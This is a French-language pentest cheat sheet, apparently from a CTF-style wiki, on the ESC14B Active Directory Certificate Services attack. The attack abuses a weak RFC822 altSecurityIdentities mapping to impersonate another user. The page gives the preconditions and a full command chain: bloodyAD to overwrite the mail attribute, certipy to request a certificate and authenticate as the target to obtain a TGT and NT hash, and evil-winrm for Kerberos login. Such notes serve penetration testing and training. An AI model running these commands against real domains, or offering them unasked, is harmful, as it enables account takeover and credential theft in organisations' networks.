# ESC14B

## <mark style="color:red;">ESC14B — Weak Certificate Mapping (RFC822)</mark>

### <mark style="color:blue;">Concept</mark>

ESC14B exploite un **mapping faible** dans l'attribut `altSecurityIdentities` d'un utilisateur AD. Quand ce mapping est basé sur l'email (RFC822), il suffit de contrôler l'attribut `mail` d'un compte pour usurper l'identité d'un autre utilisateur via un certificat.

***

### <mark style="color:blue;">Conditions requises</mark>

| Condition                          | Description                                                 |
| ---------------------------------- | ----------------------------------------------------------- |
| **Template enrollable**            | Un compte compromis peut s'inscrire sur un template ADCS    |
| **SubjectAltRequireEmail**         | Le template inclut l'email dans le certificat               |
| **altSecurityIdentities (RFC822)** | La cible a un mapping `X509:<RFC822>user@domain`            |
| **WriteProperty sur mail**         | On peut modifier l'attribut `mail` du compte qu'on contrôle |

***

### <mark style="color:blue;">Schéma d'attaque</mark>

```
[Compte A]  →  peut s'inscrire sur le template
[Compte B]  →  on peut modifier son attribut mail
[Cible]     →  altSecurityIdentities: X509:<RFC822>cible@domain.htb

1. Modifier mail de B  →  cible@domain.htb
2. Demander certificat en tant que B
   → le cert contient emailAddress=cible@domain.htb
3. Authentifier avec le cert en spécifiant la cible
   → le DC vérifie RFC822 → match → TGT obtenu
```

***

### <mark style="color:blue;">Exploitation</mark>

#### 1. Vérifier le mapping RFC822 de la cible

```bash
bloodyAD --host dc01.domain.htb -d domain.htb -u user -p pass \
  get object target_user --attr altSecurityIdentities

# Résultat attendu :
# altSecurityIdentities: X509:<RFC822>target@domain.htb
```

#### 2. Modifier l'email du compte contrôlé

```bash
bloodyAD --host dc01.domain.htb -d domain.htb -u writer_user -p pass \
  set object enrollable_user mail -v target@domain.htb
```

#### 3. Demander un certificat

```bash
certipy req -username enrollable_user@domain.htb \
  -hashes :NTLM_HASH \
  -target dc01.domain.htb \
  -ca 'CA-NAME' \
  -template 'VulnerableTemplate'
```

#### 4. S'authentifier en tant que la cible

```bash
certipy auth -pfx enrollable_user.pfx \
  -dc-ip DC_IP \
  -domain domain.htb \
  -username target_user

# → TGT + NT hash de target_user
```

#### 5. Connexion (si Protected Users → Kerberos obligatoire)

```bash
# Générer krb5.conf
netexec smb dc01.domain.htb --generate-krb5-file domain.krb5.conf
sudo cp domain.krb5.conf /etc/krb5.conf

# WinRM via Kerberos
KRB5CCNAME=target_user.ccache evil-winrm -i dc01.domain.htb -r DOMAIN.HTB
```

***

### <mark style="color:blue;">Pourquoi ça fonctionne</mark>

Quand un DC reçoit une demande d'auth par certificat, il cherche dans l'AD un utilisateur dont l'`altSecurityIdentities` correspond au contenu du certificat. Si le mapping est `X509:<RFC822>`, il compare simplement l'**email dans le certificat** avec l'email dans le champ `altSecurityIdentities`. Il ne vérifie pas que cet email appartient réellement au compte qui a demandé le certificat.

***
